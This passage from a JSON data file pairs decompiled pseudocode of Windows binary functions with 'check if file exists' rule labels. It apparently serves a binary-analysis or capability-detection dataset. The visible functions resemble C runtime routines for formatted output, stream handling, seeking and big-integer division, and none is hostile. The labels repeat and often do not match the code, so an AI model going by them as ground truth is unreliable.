8) + 4 + arg_10h_01 * 8), *(unaff_EBP + 8), 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        arg_10h_01 = *(unaff_EBP + -0x20);\n        *(unaff_EBP + -0x1c) = arg_10h_01;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0040af3c();\n    if (arg_10h_01 == *(unaff_EBP + 0x14)) {\n        fcn.0040b4cd(*(unaff_EBP + 8), *(unaff_EBP + 0x10), arg_10h_01);\n        *in_FS_OFFSET = *(unaff_EBP + -0x10);\n        return;\n    }\ncode_r0x0040af50:\n    fcn.0040fec9();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 734
    },
    "0040ccb8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040ccb8(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_30h)\n\n{\n    int32_t *arg_10h;\n    int32_t **ppiVar1;\n    uint16_t uVar2;\n    int32_t *piVar3;\n    bool bVar4;\n    bool bVar5;\n    char cVar6;\n    uchar uVar7;\n    int32_t in_ECX;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint16_t *puVar10;\n    int32_t iVar11;\n    uint unaff_EBX;\n    int32_t iVar12;\n    uint arg_8h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t *var_14h;\n    uint32_t var_10h;\n    uchar var_ch [8];\n    uint32_t var_4h;\n    \n    var_4h = *0x48e22c ^ &stack0xfffffffc;\n    cVar6 = *(in_ECX + 0x2d);\n    if (cVar6 < 'e') {\n        if (cVar6 == 'd') {\ncode_r0x0040cd7d:\n            *(in_ECX + 0x1c) = *(in_ECX + 0x1c) | 0x10;\ncode_r0x0040cd81:\n            cVar6 = fcn.0040c058(0);\n        }\n        else if (cVar6 < 'Y') {\n            if (cVar6 == 'X') {\n                arg_8h = 1;\ncode_r0x0040cd24:\n                cVar6 = fcn.0040c1d5(arg_8h);\n            }\n            else {\n                if (cVar6 != 'A') {\n                    if (cVar6 == 'C') goto code_r0x0040cd3d;\n                    if (cVar6 < 'E') goto code_r0x0040d038;\n                    if ('G' < cVar6) {\n                        if (cVar6 != 'S') goto code_r0x0040d038;\n                        goto code_r0x0040cd0c;\n                    }\n                }\ncode_r0x0040cd8b:\n                cVar6 = fcn.0040d0f4();\n            }\n        }\n        else if (cVar6 == 'Z') {\n            cVar6 = fcn.0040d09a();\n        }\n        else {\n            if (cVar6 == 'a') goto code_r0x0040cd8b;\n            if (cVar6 != 'c') goto code_r0x0040d038;\ncode_r0x0040cd3d:\n            cVar6 = fcn.0040d27e(0);\n        }\n    }\n    else if (cVar6 < 'q') {\n        if (cVar6 == 'p') {\n            cVar6 = fcn.0040d3b4();\n        }\n        else {\n            if (cVar6 < 'h') goto code_r0x0040cd8b;\n            if (cVar6 == 'i') goto code_r0x0040cd7d;\n            if (cVar6 == 'n') {\n                cVar6 = fcn.0040d313();\n            }\n            else {\n                if (cVar6 != 'o') goto code_r0x0040d038;\n                cVar6 = fcn.0040d397();\n            }\n        }\n    }\n    else {\n        if (cVar6 != 's') {\n            if (cVar6 != 'u') {\n                if (cVar6 != 'x') goto code_r0x0040d038;\n                arg_8h = 0;\n                goto code_r0x0040cd24;\n            }\n            goto code_r0x0040cd81;\n        }\ncode_r0x0040cd0c:\n        cVar6 = fcn.0040d3ca();\n    }\n    if ((cVar6 == '\\0') || (*(in_ECX + 0x2c) != '\\0')) goto code_r0x0040d038;\n    iVar8 = 0;\n    var_10h = (var_10h >> 0x10 & 0xff00) << 0x10;\n    var_18h = 0;\n    if ((*(in_ECX + 0x1c) >> 4 & 1) != 0) {\n        var_10h._1_3_ = var_10h >> 8;\n        if ((*(in_ECX + 0x1c) >> 6 & 1) == 0) {\n            if ((*(in_ECX + 0x1c) & 1) == 0) {\n                if ((*(in_ECX + 0x1c) >> 1 & 1) != 0) {\n                    var_10h = CONCAT31(var_10h._1_3_, 0x20);\n                    iVar8 = 1;\n                    var_18h = 1;\n                }\n                goto code_r0x0040ce15;\n            }\n            var_10h = CONCAT31(var_10h._1_3_, 0x2b);\n        }\n        else {\n            var_10h = CONCAT31(var_10h._1_3_, 0x2d);\n        }\n        var_18h = 1;\n        iVar8 = 1;\n    }\ncode_r0x0040ce15:\n    cVar6 = *(in_ECX + 0x2d);\n    if (((cVar6 != 'x') && (cVar6 != 'X')) || (bVar4 = true,  (*(in_ECX + 0x1c) >> 5 & 1) == 0)) {\n        bVar4 = false;\n    }\n    if ((cVar6 == 'a') || (bVar5 = false,  cVar6 == 'A')) {\n        bVar5 = true;\n    }\n    if ((bVar4) || (bVar5)) {\n        var_ch[iVar8 + -4] = 0x30;\n        if ((cVar6 == 'X') || (cVar6 == 'A')) {\n            uVar7 = 0x58;\n        }\n        else {\n            uVar7 = 0x78;\n        }\n        var_ch[iVar8 + -3] = uVar7;\n        iVar8 = iVar8 + 2;\n        var_18h = iVar8;\n    }\n    iVar11 = (*(in_ECX + 0x20) - *(in_ECX + 0x34)) - iVar8;\n    if (((*(in_ECX + 0x1c) & 0xc) == 0) && (0 < iVar11)) {\n        iVar12 = *(in_ECX + 0x14);\n        iVar9 = 0;\n        do {\n            iVar8 = *(in_ECX + 0x448);\n            if (*(*(in_ECX + 0x448) + 8) == *(iVar8 + 4)) {\n                if (*(iVar8 + 0xc) == '\\0') {\n                    iVar12 = -1;\n                }\n                else {\n                    iVar12 = iVar12 + 1;\n                }\n                *(in_ECX + 0x14) = iVar12;\n            }\n            else {\n                *(in_ECX + 0x14) = iVar12 + 1;\n                *(iVar8 + 8) = *(iVar8 + 8) + 1;\n                ***(in_ECX + 0x448) = 0x20;\n                **(in_ECX + 0x448) = **(in_ECX + 0x448) + 1;\n                iVar12 = *(in_ECX + 0x14);\n            }\n            iVar8 = var_18h;\n        } while ((iVar12 != -1) && (iVar9 = iVar9 + 1,  iVar9 < iVar11));\n    }\n    arg_10h = in_ECX + 0x14;\n    ppiVar1 = in_ECX + 0x448;\n    fcn.0040d547(&var_10h, iVar8, arg_10h);\n    if (((*(in_ECX + 0x1c) >> 3 & 1) != 0) && (((*(in_ECX + 0x1c) >> 2 & 1) == 0 && (var_10h = 0,  0 < iVar11)))) {\n        iVar8 = *arg_10h;\n        do {\n            var_14h = *ppiVar1;\n            if (var_14h[2] == var_14h[1]) {\n                if (*(var_14h + 3) == '\\0') {\n                    iVar8 = -1;\n                }\n                else {\n                    iVar8 = iVar8 + 1;\n                }\n                *arg_10h = iVar8;\n            }\n            else {\n                *arg_10h = iVar8 + 1;\n                var_14h[2] = var_14h[2] + 1;\n                ***ppiVar1 = 0x30;\n                **ppiVar1 = **ppiVar1 + 1;\n                iVar8 = *arg_10h;\n            }\n        } while ((iVar8 != -1) && (var_10h = var_10h + 1,  var_10h < iVar11));\n    }\n    iVar8 = 0;\n    if ((*(in_ECX + 0x38) == '\\0') || (*(in_ECX + 0x34) < 1)) {\n        fcn.0040d547(*(in_ECX + 0x30), *(in_ECX + 0x34), arg_10h);\n    }\n    else {\n        puVar10 = *(in_ECX + 0x30);\n        var_10h = 0;\n        do {\n            uVar2 = *puVar10;\n            puVar10 = puVar10 + 1;\n            var_14h = NULL;\n            iVar12 = fcn.004151aa(&var_14h, var_ch, 6, uVar2, *(in_ECX + 8));\n            if ((iVar12 != 0) || (var_14h == NULL)) {\n                *arg_10h = -1;\n                break;\n            }\n            fcn.0040d547(var_ch, var_14h, arg_10h);\n            var_10h = var_10h + 1;\n        } while (var_10h != *(in_ECX + 0x34));\n    }\n    iVar12 = *arg_10h;\n    if (((-1 < iVar12) && ((*(in_ECX + 0x1c) >> 2 & 1) != 0)) && (0 < iVar11)) {\n        do {\n            piVar3 = *ppiVar1;\n            if (piVar3[2] == piVar3[1]) {\n                if (*(piVar3 + 3) == '\\0') {\n                    iVar12 = -1;\n                }\n                else {\n                    iVar12 = iVar12 + 1;\n                }\n                *arg_10h = iVar12;\n            }\n            else {\n                *arg_10h = iVar12 + 1;\n                piVar3[2] = piVar3[2] + 1;\n                ***ppiVar1 = 0x20;\n                **ppiVar1 = **ppiVar1 + 1;\n                iVar12 = *arg_10h;\n            }\n        } while ((iVar12 != -1) && (iVar8 = iVar8 + 1,  iVar8 < iVar11));\n    }\ncode_r0x0040d038:\n    fcn.00406dcc(unaff_EBX);\n    return;\n}\n",
        "token_count": 2653
    },
    "0040d3ca": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040d3ca(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t arg_ch;\n    char *arg_8h;\n    \n    param_1[4] = param_1[4] + 4;\n    arg_ch = param_1[9];\n    arg_8h = *(param_1[4] + -4);\n    param_1[0xc] = arg_8h;\n    if (arg_ch == -1) {\n        arg_ch = 0x7fffffff;\n    }\n    cVar1 = fcn.0040bc7d(*param_1, param_1[1], *(param_1 + 0x2d), param_1[10]);\n    if (cVar1 == '\\0') {\n        if (arg_8h == NULL) {\n            arg_8h = \"(null)\";\n            param_1[0xc] = \"(null)\";\n        }\n        uVar2 = fcn.00410191(arg_8h, arg_ch);\n    }\n    else {\n        if (arg_8h == NULL) {\n            arg_8h = 0x425f70;\n            param_1[0xc] = 0x425f70;\n        }\n        *(param_1 + 0xe) = 1;\n        uVar2 = fcn.004102b3(arg_8h, arg_ch);\n    }\n    param_1[0xd] = uVar2;\n    return 1;\n}\n",
        "token_count": 335
    },
    "0040e78d": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nuint __cdecl fcn.0040e78d(uint arg_8h)\n\n{\n    int32_t lpCriticalSection;\n    uint *puVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00407b00(0x430c40, 0x14);\n    lpCriticalSection = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x20) = lpCriticalSection;\n    if (lpCriticalSection == 0) {\n        puVar1 = fcn.0040e0ee();\n        *puVar1 = 0x16;\n        fcn.0040b81f();\n    }\n    else {\n        *(unaff_EBP + -0x1c) = 0;\n        fcn.0040e26b(lpCriticalSection);\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x24) = lpCriticalSection;\n        if ((*(lpCriticalSection + 0xc) >> 0xc & 1) != 0) {\ncode_r0x0040e861:\n            uVar2 = fcn.0040e751(lpCriticalSection);\n            *(unaff_EBP + -0x1c) = uVar2;\n            *(unaff_EBP + -4) = 0xfffffffe;\n            fcn.0040e891();\n            goto code_r0x0040e87b;\n        }\n        uVar3 = fcn.00415447(lpCriticalSection);\n        if ((uVar3 == 0xffffffff) || (uVar3 == 0xfffffffe)) {\n            iVar5 = 0x48e488;\n        }\n        else {\n            iVar5 = (uVar3 & 0x3f) * 0x38 + *((uVar3 >> 6) * 4 + 0x48fb00);\n        }\n        iVar4 = 0x48e488;\n        if (*(iVar5 + 0x29) == '\\0') {\n            if ((uVar3 != 0xffffffff) && (uVar3 != 0xfffffffe)) {\n                iVar4 = (uVar3 & 0x3f) * 0x38 + *((uVar3 >> 6) * 4 + 0x48fb00);\n            }\n            if ((*(iVar4 + 0x2d) & 1) == 0) goto code_r0x0040e861;\n        }\n        puVar1 = fcn.0040e0ee();\n        *puVar1 = 0x16;\n        fcn.0040b81f();\n        fcn.0040b0a0(0x48e22c, unaff_EBP + -0x10, 0xfffffffe);\n    }\n    uVar2 = 0xffffffff;\ncode_r0x0040e87b:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 741
    },
    "0040e8f4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nuint __cdecl fcn.0040e8f4(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00407b00(0x430c60, 0x10);\n    iVar4 = *(unaff_EBP + 0xc);\n    if (iVar4 == 0) {\n        iVar4 = *(unaff_EBP + 0x10);\n        *(iVar4 + 0x1c) = 1;\n        *(iVar4 + 0x18) = 0x16;\n        fcn.0040b7a2(0, 0, 0, 0, 0, iVar4);\n    }\n    else {\n        *(unaff_EBP + -0x20) = 0;\n        fcn.0040e26b(iVar4);\n        *(unaff_EBP + -4) = 0;\n        if ((*(iVar4 + 0xc) >> 0xc & 1) != 0) {\ncode_r0x0040e9e1:\n            uVar1 = fcn.0040ea21(*(unaff_EBP + 8), iVar4, *(unaff_EBP + 0x10));\n            *(unaff_EBP + -0x20) = uVar1;\n            *(unaff_EBP + -4) = 0xfffffffe;\n            fcn.0040ea19();\n            goto code_r0x0040ea03;\n        }\n        uVar2 = fcn.00415447(iVar4);\n        if ((uVar2 == 0xffffffff) || (uVar2 == 0xfffffffe)) {\n            *(unaff_EBP + -0x1c) = 0x48e488;\n        }\n        else {\n            *(unaff_EBP + -0x1c) = (uVar2 & 0x3f) * 0x38 + *((uVar2 >> 6) * 4 + 0x48fb00);\n        }\n        iVar3 = 0x48e488;\n        iVar4 = *(unaff_EBP + 0xc);\n        if (*(*(unaff_EBP + -0x1c) + 0x29) == '\\0') {\n            if ((uVar2 != 0xffffffff) && (uVar2 != 0xfffffffe)) {\n                iVar3 = (uVar2 & 0x3f) * 0x38 + *((uVar2 >> 6) * 4 + 0x48fb00);\n            }\n            if ((*(iVar3 + 0x2d) & 1) == 0) goto code_r0x0040e9e1;\n        }\n        iVar4 = *(unaff_EBP + 0x10);\n        *(iVar4 + 0x1c) = 1;\n        *(iVar4 + 0x18) = 0x16;\n        fcn.0040b7a2(0, 0, 0, 0, 0, iVar4);\n        fcn.0040b0a0(0x48e22c, unaff_EBP + -0x10, 0xfffffffe);\n    }\n    uVar1 = 0xffffffff;\ncode_r0x0040ea03:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar1;\n}\n",
        "token_count": 876
    },
    "0040efcd": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040efcd(uint *arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    \n    iVar3 = CONCAT44(arg_10h, arg_ch);\n    if ((arg_8h[3] >> 0xd & 1) == 0) {\n        *(arg_18h + 0x1c) = 1;\n        *(arg_18h + 0x18) = 0x16;\n        return 0xffffffff;\n    }\n    LOCK();\n    arg_8h[3] = arg_8h[3] & 0xfffffff7;\n    cVar1 = fcn.0040eef4(arg_8h, arg_ch, arg_10h, arg_14h);\n    if (cVar1 == '\\0') {\n        if (arg_14h == 1) {\n            iVar2 = fcn.0041835f(arg_8h, arg_18h);\n            iVar3 = iVar2 + iVar3;\n            arg_14h = 0;\n        }\n        fcn.0040e625(arg_8h, arg_18h);\n        arg_8h[2] = 0;\n        *arg_8h = arg_8h[1];\n        if ((arg_8h[3] >> 2 & 1) == 0) {\n            if (((arg_8h[3] & 0x41) == 0x41) && ((arg_8h[3] >> 8 & 1) == 0)) {\n                arg_8h[6] = 0x200;\n            }\n        }\n        else {\n            LOCK();\n            arg_8h[3] = arg_8h[3] & 0xfffffffc;\n        }\n        iVar3 = fcn.00419182(arg_8h[4], iVar3, iVar3 >> 0x20, arg_14h, arg_18h);\n        if (iVar3 == -1) {\n            return 0xffffffff;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 489
    },
    "0040f211": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040f211(char *arg_8h, uint32_t arg_ch, uint32_t arg_10h, int32_t *arg_14h, int32_t arg_18h)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint arg_8h_00;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    char *arg_ch_00;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    if ((arg_ch != 0) && (arg_10h != 0)) {\n        if ((arg_14h != NULL) && ((arg_8h != NULL && (arg_10h <= 0xffffffff / arg_ch)))) {\n            puVar1 = arg_14h + 3;\n            if ((*puVar1 & 0x4c0) == 0) {\n                var_4h = 0x1000;\n            }\n            else {\n                var_4h = arg_14h[6];\n            }\n            uVar5 = arg_ch * arg_10h;\n            do {\n                if (uVar5 == 0) {\n                    return arg_10h;\n                }\n                puVar2 = arg_14h + 3;\n                if (((*puVar2 & 0xc0) == 0) || (arg_14h[2] == 0)) {\n                    if (uVar5 < var_4h) {\n                        iVar3 = fcn.004185b7(*arg_8h, arg_14h, arg_18h);\n                        if (iVar3 == -1) goto code_r0x0040f3ad;\n                        uVar5 = uVar5 - 1;\n                        var_4h = arg_14h[6];\n                        if (var_4h < 1) {\n                            var_4h = 1;\n                        }\n                        uVar4 = 1;\n                    }\n                    else {\n                        if (((*puVar2 & 0xc0) != 0) && (iVar3 = fcn.0040e625(arg_14h, arg_18h),  iVar3 != 0))\n                        goto code_r0x0040f3ad;\n                        var_8h = uVar5;\n                        if (var_4h != 0) {\n                            var_8h = uVar5 - uVar5 % var_4h;\n                        }\n                        if (0xfffffffd < var_8h) {\n                            var_8h = 0xfffffffe;\n                        }\n                        arg_ch_00 = arg_8h;\n                        uVar4 = var_8h;\n                        iVar3 = arg_18h;\n                        arg_8h_00 = fcn.00415447(arg_14h);\n                        uVar4 = fcn.0041789c(arg_8h_00, arg_ch_00, uVar4, iVar3);\n                        if (uVar4 == 0xffffffff) goto code_r0x0040f3a7;\n                        if (var_8h < uVar4) {\n                            uVar5 = uVar5 - var_8h;\n                            uVar4 = var_8h;\n                        }\n                        else {\n                            uVar5 = uVar5 - uVar4;\n                            if (uVar4 < var_8h) {\n                                LOCK();\n                                *puVar1 = *puVar1 | 0x10;\n                                goto code_r0x0040f3ad;\n                            }\n                        }\n                    }\n                }\n                else {\n                    if (arg_14h[2] < 0) {\ncode_r0x0040f3a7:\n                        LOCK();\n                        arg_14h[3] = arg_14h[3] | 0x10;\ncode_r0x0040f3ad:\n                        return (arg_ch * arg_10h - uVar5) / arg_ch;\n                    }\n                    if ((*puVar2 & 1) != 0) goto code_r0x0040f3ad;\n                    uVar4 = arg_14h[2];\n                    if (uVar5 < arg_14h[2]) {\n                        uVar4 = uVar5;\n                    }\n                    fcn.00408060(*arg_14h, arg_8h, uVar4);\n                    uVar5 = uVar5 - uVar4;\n                    arg_14h[2] = arg_14h[2] - uVar4;\n                    *arg_14h = *arg_14h + uVar4;\n                }\n                arg_8h = arg_8h + uVar4;\n            } while( true );\n        }\n        *(arg_18h + 0x1c) = 1;\n        *(arg_18h + 0x18) = 0x16;\n        fcn.0040b7a2(0, 0, 0, 0, 0, arg_18h);\n    }\n    return 0;\n}\n",
        "token_count": 1108
    },
    "0040f7f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040fb31)\n// WARNING: Removing unreachable block (ram,0x0040fb0c)\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl fcn.0040f7f0(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint32_t extraout_ECX;\n    uint32_t *puVar3;\n    uint32_t extraout_ECX_00;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    bool bVar11;\n    ulong uVar12;\n    uint64_t uVar13;\n    int64_t iVar14;\n    uint64_t uVar15;\n    uint64_t uVar16;\n    uint var_21ch;\n    uint var_218h;\n    int32_t var_4ch;\n    uint32_t var_48h;\n    uint32_t var_44h;\n    int32_t var_40h;\n    uint32_t var_3ch;\n    int32_t var_34h;\n    uint32_t *var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    uint32_t *var_1ch;\n    uint32_t *var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    uVar7 = *arg_8h;\n    if ((uVar7 != 0) && (var_44h = *arg_ch,  var_44h != 0)) {\n        uVar5 = uVar7 - 1;\n        uVar9 = var_44h - 1;\n        if (uVar9 == 0) {\n            var_4h = arg_ch[1];\n            if (var_4h == 1) {\n                uVar7 = arg_8h[1];\n                *arg_8h = 0;\n                fcn.0040ed22(arg_8h + 1, 0x1cc, &var_218h, 0);\n                return uVar7;\n            }\n            if (uVar5 == 0) {\n                uVar7 = arg_8h[1];\n                *arg_8h = 0;\n                fcn.0040ed22(arg_8h + 1, 0x1cc, &var_218h, 0);\n                uVar5 = uVar7 % var_4h;\n                arg_8h[1] = uVar5;\n                *arg_8h = uVar5 != 0;\n                return uVar7 / var_4h;\n            }\n            var_8h = 0;\n            uVar9 = 0;\n            var_18h = NULL;\n            uVar5 = 0;\n            if (uVar5 != 0xffffffff) {\n                var_1ch = arg_8h + uVar7;\n                do {\n                    uVar10 = uVar5;\n                    uVar12 = fcn.00422db0(*var_1ch, uVar9, var_4h, 0, uVar10);\n                    var_3ch = uVar12 >> 0x20;\n                    var_1ch = var_1ch + -1;\n                    uVar7 = uVar7 - 1;\n                    uVar5 = var_8h;\n                    uVar9 = extraout_ECX;\n                    var_18h = uVar10;\n                    var_8h = uVar12;\n                } while (uVar7 != 0);\n            }\n            *arg_8h = 0;\n            fcn.0040ed22(arg_8h + 1, 0x1cc, &var_218h, 0);\n            arg_8h[1] = uVar9;\n            arg_8h[2] = var_18h;\n            *arg_8h = (var_18h != NULL) + 1;\n            return CONCAT44(uVar5, var_8h);\n        }\n        if (uVar9 <= uVar5) {\n            iVar6 = uVar5 - uVar9;\n            if (iVar6 <= uVar5) {\n                puVar3 = arg_8h + uVar7;\n                puVar2 = arg_ch + var_44h;\n                uVar7 = uVar5;\n                do {\n                    if (*puVar2 != *puVar3) {\n                        if (*puVar3 <= *puVar2) goto code_r0x0040f986;\n                        break;\n                    }\n                    uVar7 = uVar7 - 1;\n                    puVar2 = puVar2 + -1;\n                    puVar3 = puVar3 + -1;\n                } while (iVar6 <= uVar7);\n            }\n            iVar6 = iVar6 + 1;\ncode_r0x0040f986:\n            if (iVar6 != 0) {\n                var_28h = arg_ch[var_44h];\n                var_20h = arg_ch[var_44h - 1];\n                iVar1 = 0x1f;\n                if (var_28h != 0) {\n                    for (; var_28h >> iVar1 == 0; iVar1 = iVar1 + -1) {\n                    }\n                }\n                if (var_28h == 0) {\n                    var_8h = 0x20;\n                }\n                else {\n                    var_8h = 0x1f - iVar1;\n                }\n                var_24h = 0x20 - var_8h;\n                if (var_8h != 0) {\n                    uVar7 = var_20h >> (var_24h & 0x1f);\n                    var_20h = var_20h << (var_8h & 0x1f);\n                    var_28h = var_28h << (var_8h & 0x1f) | uVar7;\n                    if (2 < var_44h) {\n                        var_20h = var_20h | arg_ch[var_44h - 2] >> (var_24h & 0x1f);\n                    }\n                }\n                var_1ch = NULL;\n                var_4ch = iVar6 + -1;\n                uVar8 = 0;\n                var_4h = uVar5;\n                if (-1 < var_4ch) {\n                    var_2ch = var_4ch + var_44h;\n                    var_30h = arg_8h + iVar6;\n                    puVar3 = arg_8h + var_2ch;\n                    do {\n                        var_18h = puVar3 + -1;\n                        if (var_4h < var_2ch) {\n                            uVar7 = 0;\n                        }\n                        else {\n                            uVar7 = puVar3[1];\n                        }\n                        uVar5 = *puVar3;\n                        var_10h = *var_18h;\n                        var_34h = 0;\n                        var_48h = uVar7;\n                        if (var_8h != 0) {\n                            uVar5 = var_10h >> (var_24h & 0x1f);\n                            uVar12 = fcn.00422e50();\n                            uVar7 = uVar12 >> 0x20;\n                            uVar5 = uVar5 | uVar12;\n                            var_10h = var_10h << (var_8h & 0x1f);\n                            if (2 < var_2ch) {\n                                var_10h = var_10h | var_18h[-1] >> (var_24h & 0x1f);\n                            }\n                        }\n                        uVar13 = fcn.00422db0(uVar5, uVar7, var_28h, 0, uVar7);\n                        var_34h = 0;\n                        uVar16 = extraout_ECX_00;\n                        if (uVar13 >> 0x20 != 0) {\n                            _var_40h = uVar13;\n                            iVar14 = fcn.00407570(uVar13 - 0xffffffff, var_28h, 0);\n                            var_ch = uVar13 >> 0x20;\n                            var_14h = uVar13;\n                            uVar16 = iVar14 + 4;\n                            uVar13 = 0xffffffff;\n                        }\n                        var_34h = uVar16 >> 0x20;\n                        var_14h = var_10h;\n                        while (_var_40h = uVar13,  var_34h == 0) {\n                            var_ch = uVar13 >> 0x20;\n                            var_40h = uVar13;\n                            iVar6 = var_40h;\n                            var_34h = uVar16 >> 0x20;\n                            uVar7 = uVar16;\n                            var_3ch = var_ch;\n                            var_10h = var_14h;\n                            uVar16 = uVar13;\n                            uVar15 = fcn.00407570();\n                            var_ch = uVar16 >> 0x20;\n                            var_40h = uVar16;\n                            _var_40h = uVar16 & 0xffffffff | var_3ch << 0x20;\n                            uVar13 = uVar16 & 0xffffffff00000000 | uVar13 & 0xffffffff;\n                            if (uVar15 <= CONCAT44(uVar7, var_14h)) break;\n                            uVar13 = CONCAT44(var_ch + -1 + (iVar6 != 0), iVar6 + -1);\n                            var_34h = var_34h + CARRY4(uVar7, var_28h);\n                            uVar16 = CONCAT44(var_34h, uVar7 + var_28h);\n                            var_14h = var_10h;\n                        }\n                        var_3ch = _var_40h >> 0x20;\n                        var_14h = uVar13;\n                        if (uVar13 != 0) {\n                            uVar5 = 0;\n                            uVar7 = 0;\n                            if (var_44h != 0) {\n                                puVar2 = arg_ch + 1;\n                                var_10h = var_44h;\n                                puVar3 = var_30h;\n                                do {\n                                    iVar14 = (_var_40h & 0xffffffff) * *puVar2;\n                                    uVar9 = iVar14;\n                                    uVar10 = uVar5 + uVar9;\n                                    uVar5 = uVar7 + (iVar14 >> 0x20) + var_3ch * *puVar2 + CARRY4(uVar5, uVar9);\n                                    uVar7 = 0;\n                                    if (*puVar3 < uVar10) {\n                                        bVar11 = 0xfffffffe < uVar5;\n                                        uVar5 = uVar5 + 1;\n                                        uVar7 = bVar11;\n                                    }\n                                    *puVar3 = *puVar3 - uVar10;\n                                    puVar3 = puVar3 + 1;\n                                    puVar2 = puVar2 + 1;\n                                    var_10h = var_10h - 1;\n                                } while (var_10h != 0);\n                            }\n                            if ((uVar7 != 0) || (var_48h < uVar5)) {\n                                if (var_44h != 0) {\n                                    uVar5 = 0;\n                                    puVar2 = var_30h;\n                                    uVar7 = var_44h;\n                                    puVar3 = arg_ch;\n                                    do {\n                                        puVar3 = puVar3 + 1;\n                                        uVar9 = *puVar2;\n                                        uVar10 = *puVar3;\n                                        uVar4 = uVar9 + *puVar3;\n                                        *puVar2 = uVar4 + uVar5;\n                                        uVar5 = CARRY4(uVar9, uVar10) + CARRY4(uVar4, uVar5);\n                                        uVar7 = uVar7 - 1;\n                                        puVar2 = puVar2 + 1;\n                                    } while (uVar7 != 0);\n                                }\n                                uVar13 = uVar13 - 1;\n                            }\n                            var_4h = var_2ch - 1;\n                        }\n                        var_ch = uVar13 >> 0x20;\n                        var_4ch = var_4ch + -1;\n                        var_30h = var_30h + -1;\n                        var_2ch = var_2ch - 1;\n                        uVar8 = var_1ch;\n                        var_1ch = uVar13;\n                        puVar3 = var_18h;\n                    } while (-1 < var_4ch);\n                }\n                uVar7 = var_4h + 1;\n                if (uVar7 < *arg_8h) {\n                    puVar3 = arg_8h + var_4h + 2;\n                    uVar5 = uVar7;\n                    do {\n                        *puVar3 = 0;\n                        puVar3 = puVar3 + 1;\n                        uVar5 = uVar5 + 1;\n                    } while (uVar5 < *arg_8h);\n                }\n                *arg_8h = uVar7;\n                while ((uVar7 != 0 && (arg_8h[uVar7] == 0))) {\n                    uVar7 = uVar7 - 1;\n                    *arg_8h = uVar7;\n                }\n                return CONCAT44(uVar8, var_1ch);\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 3070
    },
    "0041389b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
